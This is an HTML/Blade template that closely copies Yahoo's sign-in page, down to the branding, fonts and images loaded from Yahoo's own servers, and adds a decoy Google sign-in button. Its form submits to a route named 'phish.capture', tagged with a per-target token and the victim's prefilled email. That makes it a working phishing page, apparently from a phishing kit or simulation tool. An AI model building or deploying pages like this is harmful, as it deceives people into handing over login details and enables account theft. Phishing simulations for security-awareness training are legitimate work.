<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Login - Sign in to Yahoo</title>
    <link rel="icon" href="https://s.yimg.com/wm/mbr/images/favicon-yahoo.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Yahoo Product Sans VF","Helvetica Neue",Helvetica,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}
        .topbar{height:4px;background:linear-gradient(90deg,#6001d2 0%,#ff0050 50%,#ff6600 100%)}
        .main{flex:1;display:flex}
        .hero{flex:1;display:flex;flex-direction:column;justify-content:center;padding:60px 80px;background:linear-gradient(135deg,#f5f0ff 0%,#fff5f8 100%)}
        .hero h2{font-size:32px;font-weight:700;color:rgb(29,34,40);line-height:42px;margin-bottom:16px}
        .hero p{font-size:16px;color:rgb(91,99,106);line-height:24px}
        .login-side{width:440px;padding:40px 60px;display:flex;flex-direction:column;justify-content:center;border-left:1px solid #f0f0f0}
        .yahoo-logo{margin-bottom:32px}
        .yahoo-logo img{height:36px;width:auto}
        h1{font-family:"Centra No2","Helvetica Neue",Helvetica,Arial,sans-serif;font-size:24px;font-weight:700;color:rgb(20,20,20);line-height:26px;margin-bottom:24px}
        .form{display:flex;flex-direction:column;gap:24px}
        .form-group{display:flex;flex-direction:column;gap:6px}
        .form-group label{font-size:14px;font-weight:450;color:rgb(20,20,20);line-height:17px}
        .form-group input{width:100%;height:52px;padding:0 16px;font-size:16px;font-family:"Yahoo Product Sans VF","Helvetica Neue",sans-serif;border:1px solid rgb(205,205,205);border-radius:9999px;outline:none;background:#fff;color:rgb(20,20,20);transition:border-color .15s}
        .form-group input:focus{border-color:rgb(125,46,255)}
        .checkbox-row{display:flex;align-items:center;gap:8px}
        .checkbox-row input[type="checkbox"]{width:18px;height:18px;cursor:pointer;accent-color:rgb(125,46,255)}
        .checkbox-row label{font-size:14px;font-weight:450;color:rgb(91,99,106);cursor:pointer}
        .forgot{font-size:14px;font-weight:450;color:rgb(91,99,106);text-decoration:none;align-self:flex-end}
        .forgot:hover{text-decoration:underline}
        .btn-next{width:100%;height:52px;background:rgb(125,46,255);color:#fff;border:none;border-radius:9999px;font-size:16px;font-weight:600;cursor:pointer;font-family:"Yahoo Product Sans VF","Helvetica Neue",sans-serif;transition:background .15s}
        .btn-next:hover{background:rgb(106,38,220)}
        .or-row{display:flex;align-items:center;gap:16px;font-size:14px;color:rgb(91,99,106)}
        .or-row::before,.or-row::after{content:'';flex:1;height:1px;background:#e0e4e9}
        .google-btn{width:100%;height:52px;border:1px solid rgb(205,205,205);border-radius:9999px;background:#fff;display:flex;align-items:center;justify-content:center;gap:10px;font-size:16px;font-weight:600;color:rgb(20,20,20);cursor:pointer;font-family:"Yahoo Product Sans VF","Helvetica Neue",sans-serif;transition:background .15s}
        .google-btn:hover{background:#f5f5f5}
        .google-btn svg{width:20px;height:20px}
        .create-link{text-align:center;font-size:16px;font-weight:600;color:rgb(125,46,255);text-decoration:none}
        .create-link:hover{text-decoration:underline}
        .footer{padding:16px 24px;display:flex;justify-content:flex-end;gap:16px;font-size:14px;color:rgb(91,99,106)}
        .footer a{color:rgb(91,99,106);text-decoration:none}
        .footer a:hover{text-decoration:underline}
        @media(max-width:768px){.hero{display:none}.login-side{width:100%;border:none;padding:24px}}
    </style>
</head>
<body>
    <div class="topbar"></div>
    <div class="main">
        <div class="hero">
            <h2>Yahoo makes it easy to enjoy what matters most in your world.</h2>
            <p>Best in class Weather, Mail, News, Finance and more.</p>
        </div>
        <div class="login-side">
            <div class="yahoo-logo">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" height="36">
            </div>
            <h1>Sign in to Yahoo</h1>

            <form class="form" action="{{ route('phish.capture', ['provider' => 'yahoo', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="username">Username, email or phone number</label>
                    <input type="text" id="username" name="username" value="{{ $email }}" readonly style="cursor:default;background:#f9f9f9">
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" id="persistent" name="persistent" value="y" checked>
                    <label for="persistent">Stay signed in</label>
                </div>

                <a href="#" class="forgot">Forgot username?</a>

                <button type="submit" class="btn-next">Next</button>
            </form>

            <div class="or-row" style="margin:16px 0">or</div>

            <button class="google-btn" type="button">
                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                Sign in with Google
            </button>

            <a href="#" class="create-link" style="margin-top:16px">Create account</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
</body>
</html>
